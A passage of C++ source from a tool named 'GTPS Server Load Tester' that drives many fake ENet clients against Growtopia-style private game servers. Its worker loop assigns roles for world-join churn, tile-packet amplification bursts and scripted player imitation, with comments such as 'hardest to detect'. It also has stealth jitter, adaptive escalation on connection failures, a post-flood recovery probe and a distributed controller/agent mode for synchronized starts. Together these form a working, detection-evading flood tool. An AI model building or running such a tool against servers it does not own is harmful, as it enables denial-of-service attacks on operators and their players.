                g_stats[tid]->packets_sent.fetch_add(1, std::memory_order_relaxed);
                break;

            case ENET_EVENT_TYPE_RECEIVE:
                if (evt.packet && evt.packet->dataLength >= 4) {
                    uint8_t mt = ((uint8_t*)evt.packet->data)[0];
                    const char* txt = (evt.packet->dataLength > 4)
                        ? (const char*)evt.packet->data + 4 : "";

                    // Login response → join world
                    if (mp.role == PeerRole::LOGIN && mt == NET_MESSAGE_GENERIC_TEXT) {
                        // Join world
                        const char* w = cfg.world.c_str();
                        if (!cfg.world_list.empty()) {
                            w = cfg.world_list[mp.world_idx % cfg.world_list.size()].c_str();
                        }
                        char buf[64];
                        int len = snprintf(buf, sizeof(buf), "action|join_request\nname|%s\n", w);
                        if (len < 0 || len >= (int)sizeof(buf)) len = (int)sizeof(buf) - 1;
                        ENetPacket* pkt = enet_packet_create(nullptr, len + 4, ENET_PACKET_FLAG_RELIABLE);
                        ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GENERIC_TEXT;
                        memset((uint8_t*)pkt->data + 1, 0, 3);
                        memcpy((uint8_t*)pkt->data + 4, buf, len);
                        enet_peer_send(mp.peer, 0, pkt);
                        mp.role = PeerRole::JOINING;
                        mp.state_t = now_ms();
                        g_stats[tid]->packets_sent.fetch_add(1, std::memory_order_relaxed);
                    }

                    // Spawn → assign target role
                    if (mp.role == PeerRole::JOINING &&
                        (strstr(txt, "action|spawn") || strstr(txt, "OnSpawn"))) {
                        mp.role = mp.target_role;  // assign the role orchestrator wants
                        mp.state_t = now_ms();
                        mp.last_action = now_ms();
                        g_stats[tid]->world_joins.fetch_add(1, std::memory_order_relaxed);
                        g_clients_in_world.fetch_add(1, std::memory_order_relaxed);
                    }

                    g_stats[tid]->world_bytes_rx.fetch_add(
                        evt.packet->dataLength, std::memory_order_relaxed);
                }
                if (evt.packet) enet_packet_destroy(evt.packet);
                break;

            case ENET_EVENT_TYPE_DISCONNECT:
                if (mp.is_in_world())
                    g_clients_in_world.fetch_sub(1, std::memory_order_relaxed);
                mp.role = PeerRole::DEAD;
                mp.state_t = now_ms();
                mp.peer = nullptr;
                break;

            case ENET_EVENT_TYPE_NONE: break;
            }
        }

        // === ROLE BEHAVIORS ===
        now = now_ms();
        int alive_count = 0;

        for (int i = 0; i < n_peers; i++) {
            ManagedPeer& mp = peers[i];
            if (mp.role == PeerRole::DEAD || mp.role == PeerRole::CONNECTING ||
                mp.role == PeerRole::LOGIN || mp.role == PeerRole::JOINING)
            {
                // Handle timeouts and reconnect
                if (mp.role == PeerRole::CONNECTING && now - mp.state_t > 10000) {
                    mp.role = PeerRole::DEAD; mp.state_t = now;
                    connect_failures++;
                }
                if (mp.role == PeerRole::DEAD && mp.peer == nullptr &&
                    now - mp.state_t > 2000 + (int)(rng() % 5000)) {
                    mp.name = generate_random_name(rng);
                    mp.peer = enet_host_connect(host, &addr, 2, 0);
                    if (mp.peer) {
                        enet_peer_timeout(mp.peer, 0, 30000, 120000);
                        mp.role = PeerRole::CONNECTING;
                        mp.state_t = now;
                        total_reconnects++;
                        connect_attempts++;
                    }
                }
                continue;
            }

            alive_count++;

            switch (mp.role) {
            case PeerRole::GHOST:
                // Occasional AFK mimicry
                if (cfg.mimic_player && (rng() % 200) == 0)
                    mimic_afk_activity(mp.peer, rng);
                break;

            case PeerRole::CHURN:
                // World join/quit cycling
                if (now - mp.last_action >= cfg.churn_stay_ms + (int)(rng() % 1000)) {
                    // Quit current world
                    const char quit[] = "action|quit\n";
                    ENetPacket* pkt = enet_packet_create(nullptr, strlen(quit) + 4, ENET_PACKET_FLAG_RELIABLE);
                    ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GENERIC_TEXT;
                    memset((uint8_t*)pkt->data + 1, 0, 3);
                    memcpy((uint8_t*)pkt->data + 4, quit, strlen(quit));
                    enet_peer_send(mp.peer, 0, pkt);
                    // Join next world
                    mp.world_idx++;
                    const char* w = cfg.world.c_str();
                    if (!cfg.world_list.empty())
                        w = cfg.world_list[mp.world_idx % cfg.world_list.size()].c_str();
                    char buf[64];
                    int len = snprintf(buf, sizeof(buf), "action|join_request\nname|%s\n", w);
                    if (len < 0 || len >= (int)sizeof(buf)) len = (int)sizeof(buf) - 1;
                    pkt = enet_packet_create(nullptr, len + 4, ENET_PACKET_FLAG_RELIABLE);
                    ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GENERIC_TEXT;
                    memset((uint8_t*)pkt->data + 1, 0, 3);
                    memcpy((uint8_t*)pkt->data + 4, buf, len);
                    enet_peer_send(mp.peer, 0, pkt);
                    mp.last_action = now;
                    mp.action_count++;
                    g_stats[tid]->world_joins.fetch_add(1, std::memory_order_relaxed);
                    g_stats[tid]->packets_sent.fetch_add(2, std::memory_order_relaxed);
                }
                break;

            case PeerRole::AMP_BURST:
                // Tile burst at interval
                if (now - mp.last_action >= cfg.broadcast_burst_ms + (int)(rng() % 200)) {
                    int burst = 5 + (int)(rng() % 10);
                    for (int b = 0; b < burst; b++) {
                        TankPacket tp{}; tp.type = 3; tp.itemID = 18;
                        tp.building_x = rng() % 100; tp.building_y = rng() % 60;
                        ENetPacket* pkt = enet_packet_create(nullptr, sizeof(TankPacket) + 4, ENET_PACKET_FLAG_RELIABLE);
                        ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GAME_PACKET;
                        memset((uint8_t*)pkt->data + 1, 0, 3);
                        memcpy((uint8_t*)pkt->data + 4, &tp, sizeof(TankPacket));
                        enet_peer_send(mp.peer, 0, pkt);
                    }
                    g_stats[tid]->packets_sent.fetch_add(burst, std::memory_order_relaxed);
                    g_stats[tid]->tile_bursts.fetch_add(1, std::memory_order_relaxed);
                    mp.last_action = now;
                }
                break;

            case PeerRole::AMP_CROWD:
                // Sit in world, receive broadcasts. Occasional mimicry.
                if (cfg.mimic_player && (rng() % 300) == 0)
                    mimic_afk_activity(mp.peer, rng);
                break;

            case PeerRole::PLAYER: {
                // Full gameplay simulation — most realistic, hardest to detect
                int action_interval = 1500 + (int)(rng() % 5000);  // 1.5-6.5 sec
                if (now - mp.last_action >= action_interval) {
                    int roll = rng() % 100;

                    if (roll < 30) {
                        // 30%: Movement — walk to position (like exploring)
                        TankPacket tp{}; tp.type = 0;  // STATE update
                        // Move in small steps from current position (more realistic)
                        tp.x = (float)(200 + (mp.action_count * 37 + rng()) % 2000);
                        tp.y = (float)(200 + (mp.action_count * 13 + rng()) % 1200);
                        tp.xspeed = ((float)(rng() % 100) - 50) / 30.0f;
                        tp.yspeed = 0;
                        ENetPacket* pkt = enet_packet_create(nullptr, sizeof(TankPacket) + 4, 0);
                        ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GAME_PACKET;
                        memset((uint8_t*)pkt->data + 1, 0, 3);
                        memcpy((uint8_t*)pkt->data + 4, &tp, sizeof(TankPacket));
                        enet_peer_send(mp.peer, 0, pkt);
                        g_stats[tid]->packets_sent.fetch_add(1, std::memory_order_relaxed);

                    } else if (roll < 55) {
                        // 25%: Farm tiles — punch 2-6 tiles in a cluster (like farming)
                        int punches = 2 + (int)(rng() % 5);
                        int base_x = 10 + (mp.action_count * 3) % 80;
                        int base_y = 24 + (rng() % 20);
                        uint32_t item = farm_items[rng() % 6];
                        for (int p = 0; p < punches; p++) {
                            TankPacket tp{}; tp.type = 3; tp.itemID = item;
                            tp.building_x = base_x + (p % 3);  // cluster pattern
                            tp.building_y = base_y + (p / 3);
                            ENetPacket* pkt = enet_packet_create(nullptr, sizeof(TankPacket) + 4, ENET_PACKET_FLAG_RELIABLE);
                            ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GAME_PACKET;
                            memset((uint8_t*)pkt->data + 1, 0, 3);
                            memcpy((uint8_t*)pkt->data + 4, &tp, sizeof(TankPacket));
                            enet_peer_send(mp.peer, 0, pkt);
                            // Small delay between punches (realistic)
                            std::this_thread::sleep_for(std::chrono::milliseconds(80 + rng() % 150));
                        }
                        g_stats[tid]->packets_sent.fetch_add(punches, std::memory_order_relaxed);

                    } else if (roll < 70) {
                        // 15%: Chat — send random message
                        const char* msg = chat_msgs[rng() % n_chats];
                        char buf[128];
                        int len = snprintf(buf, sizeof(buf), "action|input\n|text|%s\n", msg);
                        if (len < 0 || len >= (int)sizeof(buf)) len = (int)sizeof(buf) - 1;
                        ENetPacket* pkt = enet_packet_create(nullptr, len + 4, ENET_PACKET_FLAG_RELIABLE);
                        ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GENERIC_TEXT;
                        memset((uint8_t*)pkt->data + 1, 0, 3);
                        memcpy((uint8_t*)pkt->data + 4, buf, len);
                        enet_peer_send(mp.peer, 0, pkt);
                        g_stats[tid]->packets_sent.fetch_add(1, std::memory_order_relaxed);

                    } else if (roll < 80) {
                        // 10%: Place tile — place random block (like building)
                        TankPacket tp{}; tp.type = 3;
                        tp.itemID = farm_items[1 + rng() % 5];  // not fist
                        tp.building_x = 5 + (rng() % 90);
                        tp.building_y = 5 + (rng() % 50);
                        ENetPacket* pkt = enet_packet_create(nullptr, sizeof(TankPacket) + 4, ENET_PACKET_FLAG_RELIABLE);
                        ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GAME_PACKET;
                        memset((uint8_t*)pkt->data + 1, 0, 3);
                        memcpy((uint8_t*)pkt->data + 4, &tp, sizeof(TankPacket));
                        enet_peer_send(mp.peer, 0, pkt);
                        g_stats[tid]->packets_sent.fetch_add(1, std::memory_order_relaxed);

                    } else if (roll < 88) {
                        // 8%: Wrench/interact — wrench a door or sign
                        TankPacket tp{}; tp.type = 3; tp.itemID = 32; // wrench
                        tp.building_x = rng() % 100;
                        tp.building_y = rng() % 60;
                        ENetPacket* pkt = enet_packet_create(nullptr, sizeof(TankPacket) + 4, ENET_PACKET_FLAG_RELIABLE);
                        ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GAME_PACKET;
                        memset((uint8_t*)pkt->data + 1, 0, 3);
                        memcpy((uint8_t*)pkt->data + 4, &tp, sizeof(TankPacket));
                        enet_peer_send(mp.peer, 0, pkt);
                        g_stats[tid]->packets_sent.fetch_add(1, std::memory_order_relaxed);

                    } else {
                        // 12%: Idle — do nothing (realistic AFK moment)
                    }

                    mp.last_action = now;
                    mp.action_count++;
                }
                break;
            }

            default: break;
            }

            // Session lifecycle: disconnect after session time expires
            if (mp.session_remaining_sec > 0 && mp.is_in_world()) {
                mp.session_remaining_sec--;
                if (mp.session_remaining_sec <= 0) {
                    enet_peer_disconnect(mp.peer, 0);  // graceful disconnect
                    g_clients_in_world.fetch_sub(1, std::memory_order_relaxed);
                    mp.role = PeerRole::DEAD;
                    mp.state_t = now;
                    mp.peer = nullptr;
                    mp.session_remaining_sec = 600 + (int)(rng() % 2400);  // new session length
                }
            }
        }

        if (alive_count > peak_alive) peak_alive = alive_count;

        // === PHASE 3: SCENARIO TRANSITIONS ===
        if (!scenario.empty() && current_phase_idx < (int)scenario.size()) {
            int phase_elapsed = (int)((now - phase_start_t) / 1000);
            if (phase_elapsed >= scenario[current_phase_idx].duration_sec) {
                current_phase_idx++;
                if (current_phase_idx < (int)scenario.size()) {
                    roles = scenario[current_phase_idx].roles;
                    assign_roles(peers, roles);
                    phase_start_t = now;
                    printf("[orch t%d] → phase %d/%zu: '%s' (%ds)  ghost:%d%% churn:%d%% amp:%d%% player:%d%%\n",
                           tid, current_phase_idx + 1, scenario.size(),
                           scenario[current_phase_idx].name.c_str(),
                           scenario[current_phase_idx].duration_sec,
                           roles.ghost_pct, roles.churn_pct, roles.amp_pct, roles.player_pct);
                } else {
                    printf("[orch t%d] all scenario phases complete\n", tid);
                }
            }
        }

        // === PHASE 4: ADAPTIVE ADJUSTMENT ===
        if (cfg.adaptive && now - adaptive.last_probe >= adaptive.probe_interval_sec * 1000) {
            // Calculate connect failure rate
            int fail_pct = (connect_attempts > 0)
                ? (connect_failures * 100 / connect_attempts) : 0;
            bool probe_ok = (fail_pct < 20);

            RoleAllocation new_roles = adaptive.adjust(roles, probe_ok, fail_pct);
            if (new_roles.ghost_pct != roles.ghost_pct ||
                new_roles.churn_pct != roles.churn_pct) {
                roles = new_roles;
                assign_roles(peers, roles);
                printf("[orch t%d] adaptive → ghost:%d%% churn:%d%% amp:%d%% player:%d%% (level %d)\n",
                       tid, roles.ghost_pct, roles.churn_pct, roles.amp_pct,
                       roles.player_pct, adaptive.escalation_level);
            }
            adaptive.last_probe = now;
            connect_attempts = 0;
            connect_failures = 0;
        }

        // === ROLE ROTATION (manual, if no scenario) ===
        if (scenario.empty() && cfg.rotate_sec > 0 && now - last_rotate >= cfg.rotate_sec * 1000) {
            // Rotate to next allocation preset
            // Simple rotation: shift percentages
            int tmp = roles.ghost_pct;
            roles.ghost_pct = roles.churn_pct;
            roles.churn_pct = roles.amp_pct;
            roles.amp_pct = roles.player_pct;
            roles.player_pct = tmp;
            assign_roles(peers, roles);
            last_rotate = now;
            rotate_idx++;
            printf("[orch t%d] ROTATE #%d → ghost:%d%% churn:%d%% amp:%d%% player:%d%%\n",
                   tid, rotate_idx, roles.ghost_pct, roles.churn_pct,
                   roles.amp_pct, roles.player_pct);
        }

        stealth_jitter(cfg.jitter_ms / 3, rng);
    }

    for (auto& mp : peers) { if (mp.peer) enet_peer_disconnect_now(mp.peer, 0); }
    enet_host_flush(host);
    enet_host_destroy(host);
    printf("[orch t%d] exit  peak=%d  reconnects=%d\n", tid, peak_alive, total_reconnects);
}

// ============================================================================
// v7: run_cooldown — Recovery measurement after flood stops
//
// Setelah g_running = false dan semua workers selesai, cooldown phase dimulai.
// Probe RTT setiap 500ms. Catat ke CSV. Selesai saat:
//   - RTT < 110% baseline selama 3 detik berturut-turut, atau
//   - cooldown_sec timeout.
// Output: recovery_time_sec di stdout dan CSV.
// ============================================================================

static void run_cooldown(const Config& cfg) {
    printf("\n[cooldown] starting %d sec recovery probe...\n", cfg.cooldown_sec);

    ENetHost* host = enet_host_create(nullptr, 1, 2, 0, 0);
    if (!host) { fprintf(stderr, "[cooldown] host_create failed\n"); return; }

    ENetAddress addr{};
    enet_address_set_host(&addr, cfg.target.c_str());
    addr.port = cfg.port;

    // CSV for cooldown data
    std::ofstream csv_f;
    if (!cfg.csv_file.empty()) {
        std::string path = "cooldown_" + cfg.csv_file;
        if (path.find(".csv") == std::string::npos) path += ".csv";
        csv_f.open(path, std::ios::out | std::ios::trunc);
        if (csv_f.is_open())
            csv_f << "t,rtt_us,status\n";
    }

    // First: establish connection to measure baseline
    ENetPeer* peer = enet_host_connect(host, &addr, 2, 0);
    if (!peer) {
        fprintf(stderr, "[cooldown] connect failed\n");
        enet_host_destroy(host);
        return;
    }

    // Wait for connection
    ENetEvent evt;
    bool connected = false;
    for (int w = 0; w < 20; w++) {  // 5 second timeout
        if (enet_host_service(host, &evt, 250) > 0 &&
            evt.type == ENET_EVENT_TYPE_CONNECT) {
            connected = true;
            break;
        }
    }
    if (!connected) {
        printf("[cooldown] t=0  server unreachable — measuring from cold start\n");
    }

    // Baseline: use global RTT p50 from the test (if available)
    double baseline_us = 0;
    if (g_global_rtt.count > 0) {
        baseline_us = (double)g_global_rtt.percentile(50);
    }
    double threshold_us = (baseline_us > 0) ? baseline_us * 1.10 : 50000.0;  // 110% or 50ms fallback

    printf("[cooldown] baseline_p50=%.0fus  threshold=%.0fus\n", baseline_us, threshold_us);

    int stable_count = 0;
    int recovery_t = -1;

    for (int t = 1; t <= cfg.cooldown_sec; t++) {
        std::this_thread::sleep_for(std::chrono::milliseconds(500));

        // Service ENet to get fresh RTT + handle reconnect
        for (int i = 0; i < 4; i++) {
            if (enet_host_service(host, &evt, 100) > 0) {
                if (evt.type == ENET_EVENT_TYPE_CONNECT) connected = true;
                if (evt.type == ENET_EVENT_TYPE_DISCONNECT) {
                    connected = false;
                    peer = nullptr;
                }
                if (evt.packet) enet_packet_destroy(evt.packet);
            }
        }

        // Reconnect if needed
        if (!connected && !peer) {
            peer = enet_host_connect(host, &addr, 2, 0);
        }

        double rtt_us = connected && peer ? (double)peer->roundTripTime * 1000.0 : 0.0;
        const char* status;

        if (!connected) {
            status = "unreachable";
            stable_count = 0;
        } else if (rtt_us <= threshold_us) {
            status = "recovered";
            stable_count++;
        } else {
            status = "degraded";
            stable_count = 0;
        }

        printf("[cooldown t=%3d]  rtt=%7.1fus  %s\n", t, rtt_us, status);

        if (csv_f.is_open()) {
            csv_f << t << "," << (uint64_t)rtt_us << "," << status << "\n";
            csv_f.flush();
        }

        // Stable for 3 consecutive probes = recovered
        if (stable_count >= 3 && recovery_t < 0) {
            recovery_t = t - 2;  // first stable point
            printf("\n[cooldown] *** RECOVERED at t=%d sec ***\n\n", recovery_t);
            // Continue probing to confirm stability
        }
    }

    if (recovery_t < 0) {
        printf("\n[cooldown] *** NOT RECOVERED within %d sec ***\n", cfg.cooldown_sec);
        recovery_t = cfg.cooldown_sec;
    }

    printf("[cooldown] recovery_time_sec: %d\n", recovery_t);

    if (peer) enet_peer_disconnect_now(peer, 0);
    enet_host_flush(host);
    enet_host_destroy(host);
}

// ============================================================================
// stats_reporter — reads all ThreadStats, prints + CSV
// ============================================================================

struct SnapStats {
    uint64_t packets_sent;
    uint64_t bytes_sent;
    uint64_t errors;
    uint64_t world_bytes_rx;
    uint64_t world_joins;
    uint64_t tile_bursts;
    int      active_clients;
};

static SnapStats snapshot_stats() {
    SnapStats s{};
    for (auto& ts : g_stats) {
        s.packets_sent   += ts->packets_sent.load(std::memory_order_relaxed);
        s.bytes_sent     += ts->bytes_sent.load(std::memory_order_relaxed);
        s.errors         += ts->errors.load(std::memory_order_relaxed);
        s.world_bytes_rx += ts->world_bytes_rx.load(std::memory_order_relaxed);
        s.world_joins    += ts->world_joins.load(std::memory_order_relaxed);
        s.tile_bursts    += ts->tile_bursts.load(std::memory_order_relaxed);
        s.active_clients += ts->active_clients.load(std::memory_order_relaxed);
    }
    return s;
}

#ifdef USE_NCURSES
static WINDOW* g_ncwin = nullptr;
static void ncurses_init() {
    g_ncwin = initscr();
    cbreak(); noecho(); curs_set(0);
    start_color();
    init_pair(1, COLOR_GREEN,  COLOR_BLACK);
    init_pair(2, COLOR_YELLOW, COLOR_BLACK);
    init_pair(3, COLOR_RED,    COLOR_BLACK);
    init_pair(4, COLOR_CYAN,   COLOR_BLACK);
}
static void ncurses_cleanup() {
    endwin();
}
#endif

static void stats_reporter(const Config& cfg) {
    CSVWriter csv;
    if (!cfg.csv_file.empty()) {
        if (!csv.open(cfg.csv_file))
            fprintf(stderr, "[warn] Cannot open CSV: %s\n", cfg.csv_file.c_str());
    }

#ifdef USE_NCURSES
    if (cfg.dashboard) ncurses_init();
#endif

    SnapStats prev{};
    int t = 0;

    while (g_running.load()) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        if (g_in_warmup.load()) continue;
        t++;

        SnapStats cur = snapshot_stats();
        uint64_t dpkts  = cur.packets_sent   - prev.packets_sent;
        uint64_t dbytes = cur.bytes_sent      - prev.bytes_sent;
        uint64_t derrs  = cur.errors          - prev.errors;
        uint64_t dwrx   = cur.world_bytes_rx  - prev.world_bytes_rx;
        uint64_t dbursts= cur.tile_bursts     - prev.tile_bursts;
        uint64_t djoins = cur.world_joins     - prev.world_joins;
        prev = cur;

        double pps    = (double)dpkts;
        double mbps   = dbytes * 8.0 / 1e6;
        double wkbps  = dwrx * 8.0 / 1000.0;
        int    cw     = g_clients_in_world.load(std::memory_order_relaxed);
        int    active = cur.active_clients;

        // Merge RTT from all threads into global histogram
        g_global_rtt.reset();
        for (auto& ts : g_stats)
            g_global_rtt.merge_from(ts->rtt_hist);

        uint64_t p50 = g_global_rtt.percentile(50);
        uint64_t p95 = g_global_rtt.percentile(95);
        uint64_t p99 = g_global_rtt.percentile(99);

        // Update peaks
        {
            std::lock_guard<std::mutex> lk(g_peaks.mtx);
            if (pps  > g_peaks.pps_peak)  g_peaks.pps_peak  = pps;
            if (mbps > g_peaks.mbps_peak) g_peaks.mbps_peak = mbps;
        }

        std::string phase_name = g_phase.get_phase_name();
        int         phase_num  = g_phase.phase_num.load();

#ifdef USE_NCURSES
        if (cfg.dashboard && g_ncwin) {
            werase(g_ncwin);
            int row = 0;
            wattron(g_ncwin, COLOR_PAIR(4) | A_BOLD);
            mvwprintw(g_ncwin, row++, 0,
                "GTPS Server Load Tester %s — %s:%d",
                GTPS_SLT_VERSION, cfg.target.c_str(), cfg.port);
            wattroff(g_ncwin, COLOR_PAIR(4) | A_BOLD);
            row++;
            mvwprintw(g_ncwin, row++, 0, "Time:    %4d s", t);
            mvwprintw(g_ncwin, row++, 0, "Phase:   %d  %s", phase_num, phase_name.c_str());
            row++;
            mvwprintw(g_ncwin, row++, 0, "PPS:     %8.0f  (peak %.0f)", pps, g_peaks.pps_peak);
            mvwprintw(g_ncwin, row++, 0, "Mbps:    %8.2f  (peak %.2f)", mbps, g_peaks.mbps_peak);
            row++;
            mvwprintw(g_ncwin, row++, 0, "RTT p50: %8.2f ms", p50 / 1000.0);
            int pair = (p95 > 200000) ? 3 : (p95 > 100000) ? 2 : 1;
            wattron(g_ncwin, COLOR_PAIR(pair));
            mvwprintw(g_ncwin, row++, 0, "RTT p95: %8.2f ms", p95 / 1000.0);
            wattroff(g_ncwin, COLOR_PAIR(pair));
            mvwprintw(g_ncwin, row++, 0, "RTT p99: %8.2f ms", p99 / 1000.0);
            row++;
            mvwprintw(g_ncwin, row++, 0, "Active clients:   %d", active);
            mvwprintw(g_ncwin, row++, 0, "Clients in world: %d", cw);
            mvwprintw(g_ncwin, row++, 0, "World kbps rx:    %.1f", wkbps);
            mvwprintw(g_ncwin, row++, 0, "Tile bursts/s:    %lu", (unsigned long)dbursts);
            mvwprintw(g_ncwin, row++, 0, "World joins/s:    %lu", (unsigned long)djoins);
            mvwprintw(g_ncwin, row++, 0, "Errors/s:         %lu", (unsigned long)derrs);
            wrefresh(g_ncwin);
        } else
#endif
        {
            printf("[%4d] pps=%6.0f mbps=%5.2f | p50=%5.2fms p95=%5.2fms p99=%5.2fms"
                   " | active=%d cw=%d wkbps=%.0f | bursts=%lu joins=%lu errs=%lu | %s\n",
                   t, pps, mbps, p50/1000.0, p95/1000.0, p99/1000.0,
                   active, cw, wkbps,
                   (unsigned long)dbursts, (unsigned long)djoins, (unsigned long)derrs,
                   phase_name.c_str());
            fflush(stdout);
        }

        if (!cfg.csv_file.empty())
            csv.write_row(t, pps, mbps, p50, p95, p99, active, cw, wkbps,
                          dbursts, djoins, derrs, phase_name, phase_num);
    }

#ifdef USE_NCURSES
    if (cfg.dashboard) ncurses_cleanup();
#endif
}

// ============================================================================
// run_warmup / print_summary
// ============================================================================

static void run_warmup(int warmup_sec) {
    if (warmup_sec <= 0) return;
    g_in_warmup.store(true);
    printf("[warmup] %d seconds...\n", warmup_sec);
    std::this_thread::sleep_for(std::chrono::seconds(warmup_sec));
    // Reset counters
    for (auto& ts : g_stats) {
        ts->packets_sent.store(0);   ts->bytes_sent.store(0);
        ts->errors.store(0);         ts->world_bytes_rx.store(0);
        ts->world_joins.store(0);    ts->tile_bursts.store(0);
        ts->send_failures.store(0);  ts->rtt_samples.store(0);
        ts->rtt_hist.reset();
    }
    g_global_rtt.reset();
    g_in_warmup.store(false);
    printf("[warmup] Done. Starting measurement.\n");
}

static void print_summary() {
    SnapStats s = snapshot_stats();
    uint64_t p50 = g_global_rtt.percentile(50);
    uint64_t p95 = g_global_rtt.percentile(95);
    uint64_t p99 = g_global_rtt.percentile(99);
    printf("\n=== SUMMARY ===\n");
    printf("Total packets:   %lu\n",   (unsigned long)s.packets_sent);
    printf("Total bytes:     %lu\n",   (unsigned long)s.bytes_sent);
    printf("Total errors:    %lu\n",   (unsigned long)s.errors);
    printf("World joins:     %lu\n",   (unsigned long)s.world_joins);
    printf("Tile bursts:     %lu\n",   (unsigned long)s.tile_bursts);
    printf("RTT p50:         %.2f ms\n", p50 / 1000.0);
    printf("RTT p95:         %.2f ms\n", p95 / 1000.0);
    printf("RTT p99:         %.2f ms\n", p99 / 1000.0);
    {
        std::lock_guard<std::mutex> lk(g_peaks.mtx);
        printf("Peak PPS:        %.0f\n", g_peaks.pps_peak);
        printf("Peak Mbps:       %.2f\n", g_peaks.mbps_peak);
    }
    printf("================\n");
}

// ============================================================================
// v6 FEATURE 6a — Agent mode
//
// Flow: bind TCP → accept → HELLO → START → run test → stream STAT → DONE
// ============================================================================

// Build START config JSON from Config struct (for controller → agent)
static std::string cfg_to_start_json(const Config& cfg, int64_t t0_ms) {
    std::string pname;
    switch (cfg.pattern) {
        case PatternType::CONSTANT:   pname = "constant"; break;
        case PatternType::BURST:      pname = "burst"; break;
        case PatternType::RAMP:       pname = "ramp"; break;
        case PatternType::SINUSOIDAL: pname = "sinusoidal"; break;
        case PatternType::RANDOM:     pname = "random"; break;
    }
    return JsonBuild{}
        .add("mode",            cfg.mode)
        .add("host",            cfg.target)
        .add("port",            (int64_t)cfg.port)
        .add("pps",             (int64_t)cfg.pps)
        .add("clients",         (int64_t)cfg.clients)
        .add("threads",         (int64_t)cfg.threads)
        .add("hosts",           (int64_t)cfg.hosts)
        .add("duration",        (int64_t)cfg.duration)
        .add("world",           cfg.world)
        .add("crowd",           cfg.crowd_mode)
        .add("crowd_stay_ms",   (int64_t)cfg.crowd_stay_ms)
        .add("tile_burst_count",(int64_t)cfg.tile_burst_count)
        .add("tile_burst_ms",   (int64_t)cfg.tile_burst_ms)
        .add("pattern",         pname)
        .add("adaptive",        cfg.adaptive)
        .add("target_rtt_us",   (int64_t)(int)cfg.target_rtt_us)
        .add("t0_ms",           t0_ms)
        .add("secret",          cfg.agent_secret)
        .str();
}

// Build Config from START json (agent side)
static Config cfg_from_start_json(const std::string& j) {
    Config cfg;
    cfg.mode            = json_str(j, "mode", "game");
    cfg.target          = json_str(j, "host", "127.0.0.1");
    cfg.port            = (uint16_t)json_int(j, "port", DEFAULT_PORT);
    cfg.pps             = json_int(j, "pps",  DEFAULT_PPS);
    cfg.clients         = json_int(j, "clients", DEFAULT_CLIENTS);
    cfg.threads         = json_int(j, "threads", DEFAULT_THREADS);
    cfg.hosts           = json_int(j, "hosts",   DEFAULT_HOSTS);
    cfg.duration        = json_int(j, "duration", DEFAULT_DURATION);
    cfg.world           = json_str(j, "world", "START");
    cfg.crowd_mode      = json_bool(j, "crowd", false);
    cfg.crowd_stay_ms   = json_int(j, "crowd_stay_ms", DEFAULT_CROWD_STAY_MS);
    cfg.tile_burst_count= json_int(j, "tile_burst_count", DEFAULT_TILE_BURST_COUNT);
    cfg.tile_burst_ms   = json_int(j, "tile_burst_ms",    DEFAULT_TILE_BURST_MS);
    cfg.adaptive        = json_bool(j, "adaptive", false);
    cfg.target_rtt_us   = (double)json_int(j, "target_rtt_us", 50000);
    cfg.tp.constant_pps = cfg.pps;
    cfg.tp.sin_base_pps = cfg.pps;
    cfg.tp.rw_start_pps = cfg.pps;
    auto ps = json_str(j, "pattern", "constant");
    auto pit = PATTERN_MAP.find(ps);
    cfg.pattern = (pit != PATTERN_MAP.end()) ? pit->second : PatternType::CONSTANT;
    return cfg;
}

// Build a per-second STAT json line
static std::string build_stat_json(int t_sec,
                                    double pps, double mbps,
                                    uint64_t p50, uint64_t p95, uint64_t p99,
                                    int active, int cw,
                                    uint64_t errs, uint64_t bursts,
                                    const std::string& phase, int phase_num) {
    return JsonBuild{}
        .add("t",         (int64_t)t_sec)
        .add("pps",       (int64_t)(int64_t)pps)
        .add("mbps",      mbps, 3)
        .add("rtt_p50",   (int64_t)p50)
        .add("rtt_p95",   (int64_t)p95)
        .add("rtt_p99",   (int64_t)p99)
        .add("active",    (int64_t)active)
        .add("cw",        (int64_t)cw)
        .add("errors",    (int64_t)errs)
        .add("bursts",    (int64_t)bursts)
        .add("phase",     phase)
        .add("phase_num", (int64_t)phase_num)
        .str();
}

// Agent session: handle one controller connection
// Returns after test completes or connection drops
static void agent_session(int ctrl_fd, const Config& agent_cfg) {
    printf("[agent] Controller connected.\n");

    std::string line;

    // 1. Read HELLO
    if (!tcp_readline(ctrl_fd, line, 10000)) {
        printf("[agent] Timeout waiting for HELLO.\n");
        return;
    }
    if (line.substr(0, 5) != "HELLO") {
        printf("[agent] Expected HELLO, got: %s\n", line.c_str());
        tcp_send_line(ctrl_fd, "ERR Expected HELLO");
        return;
    }
    // Validate secret
    if (!agent_cfg.agent_secret.empty()) {
        std::string got_secret = (line.size() > 6) ? line.substr(6) : "";
        if (got_secret != agent_cfg.agent_secret) {
            tcp_send_line(ctrl_fd, "ERR Bad secret");
            printf("[agent] Auth failed (wrong secret).\n");
            return;
        }
    }
    tcp_send_line(ctrl_fd, std::string("OK GTPS-SLT-") + GTPS_SLT_VERSION);

    // 2. Read START {json}
    if (!tcp_readline(ctrl_fd, line, 30000)) {
        printf("[agent] Timeout waiting for START.\n");
        return;
    }
    if (line.substr(0, 5) != "START") {
        printf("[agent] Expected START, got: %s\n", line.c_str());
        tcp_send_line(ctrl_fd, "ERR Expected START");
        return;
    }
    std::string start_json = (line.size() > 6) ? line.substr(6) : "{}";
    Config run_cfg = cfg_from_start_json(start_json);

    // 3. Wait for T₀ (synchronized start)
    int64_t t0_ms = json_i64(start_json, "t0_ms", 0);
    int64_t now   = epoch_ms();
    if (t0_ms > now) {
        int64_t wait = t0_ms - now;
        if (wait > 10000) wait = 10000; // safety cap
        printf("[agent] Waiting %lld ms for synchronized T₀\n", (long long)wait);
        std::this_thread::sleep_for(std::chrono::milliseconds(wait));
    }

    tcp_send_line(ctrl_fd, "READY");
    printf("[agent] Starting test: mode=%s host=%s pps=%d clients=%d duration=%d\n",
        run_cfg.mode.c_str(), run_cfg.target.c_str(),
        run_cfg.pps, run_cfg.clients, run_cfg.duration);

    // 4. Set up global state for this test
    g_running.store(true);
    g_in_warmup.store(false);
